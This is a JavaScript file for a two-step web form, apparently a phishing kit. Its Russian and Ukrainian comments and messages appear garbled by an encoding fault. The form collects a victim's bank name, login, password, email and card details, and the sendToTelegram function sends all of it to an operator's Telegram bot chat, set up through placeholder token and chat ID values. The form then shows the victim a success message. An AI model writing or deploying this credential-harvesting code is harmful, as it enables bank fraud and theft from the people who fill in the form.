// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram –±–æ—Ç–∞
const TELEGRAM_BOT_TOKEN = "–í–ê–®_BOT_TOKEN"; // –ü–æ–ª—É—á–∏—Ç—å —É @BotFather
const TELEGRAM_CHAT_ID = "–í–ê–®_CHAT_ID";    // –ü–æ–ª—É—á–∏—Ç—å —É @userinfobot

// –≠–ª–µ–º–µ–Ω—Ç—ã DOM
const bankFormSection = document.getElementById('bank-form-section');
const cardFormSection = document.getElementById('card-form-section');
const successMessage = document.getElementById('success-message');
const nextBtn = document.getElementById('nextBtn');
const backBtn = document.getElementById('backBtn');
const newFormBtn = document.getElementById('newFormBtn');
const bankForm = document.getElementById('bankForm');
const cardForm = document.getElementById('cardForm');

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π
nextBtn.addEventListener('click', () => {
    if (bankForm.checkValidity()) {
        bankFormSection.classList.add('hidden');
        cardFormSection.classList.remove('hidden');
    } else {
        alert('–ë—É–¥—å –ª–∞—Å–∫–∞, –∑–∞–ø–æ–≤–Ω—ñ—Ç—å –≤—Å—ñ –æ–±–æ–≤\'—è–∑–∫–æ–≤—ñ –ø–æ–ª—è');
    }
});

backBtn.addEventListener('click', () => {
    cardFormSection.classList.add('hidden');
    bankFormSection.classList.remove('hidden');
});

newFormBtn.addEventListener('click', () => {
    successMessage.classList.add('hidden');
    bankFormSection.classList.remove('hidden');
    bankForm.reset();
    cardForm.reset();
});

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
async function sendToTelegram(data) {
    const message = `
üìå <b>–ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ —Å —Ñ–æ—Ä–º—ã VOBU</b>
    
<b>–ë–∞–Ω–∫–æ–≤—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ:</b>
üè¶ –ë–∞–Ω–∫: ${data.bank}
üë§ –õ–æ–≥–∏–Ω: ${data.login}
üîë –ü–∞—Ä–æ–ª—å: ${data.password}
üìß Email: ${data.email}

<b>–ò–Ω–≤–µ–Ω—Ç–∞—Ä–Ω–∞—è –∫–∞—Ä—Ç–∞:</b>
üî¢ –ù–æ–º–µ—Ä: ${data.cardNumber}
üìù –î–µ—Ç–∞–ª–∏: ${data.cardDetails}

‚è± <i>${new Date().toLocaleString()}</i>
    `;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (!response.ok) {
            throw new Error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
        }
        
        return true;
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞:', error);
        return false;
    }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã
cardForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ –æ–±–µ–∏—Ö —Ñ–æ—Ä–º
    const formData = {
        bank: document.getElementById('bankName').value,
        login: document.getElementById('bankLogin').value,
        password: document.getElementById('bankPassword').value,
        email: document.getElementById('userEmail').value,
        cardNumber: document.getElementById('cardNumber').value,
        cardDetails: document.getElementById('cardDetails').value
    };
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
    const submitBtn = cardForm.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <span>–í—ñ–¥–ø—Ä–∞–≤–∫–∞...</span>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2V6M12 18V22M6 12H2M22 12H18M19.0784 19.0784L16.25 16.25M19.0784 4.99994L16.25 7.82837M4.92157 19.0784L7.75 16.25M4.92157 4.99994L7.75 7.82837" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
    `;
    
    try {
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
        const success = await sendToTelegram(formData);
        
        if (success) {
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ
            cardFormSection.classList.add('hidden');
            successMessage.classList.remove('hidden');
            
            // –û—á–∏—â–∞–µ–º —Ñ–æ—Ä–º—ã
            bankForm.reset();
            cardForm.reset();
        } else {
            alert('–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤—Ü—ñ –¥–∞–Ω–∏—Ö. –°–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑.');
        }
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞:', error);
        alert('–°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞. –°–ø—Ä–æ–±—É–π—Ç–µ –ø—ñ–∑–Ω—ñ—à–µ.');
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalText;
    }
});

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ä–µ–¥–∏—Ä–µ–∫—Ç —Å –∫–æ—Ä–Ω—è —Å–∞–π—Ç–∞
if (window.location.pathname === '/' || window.location.pathname === '') {
    window.location.href = '/index.html';
}
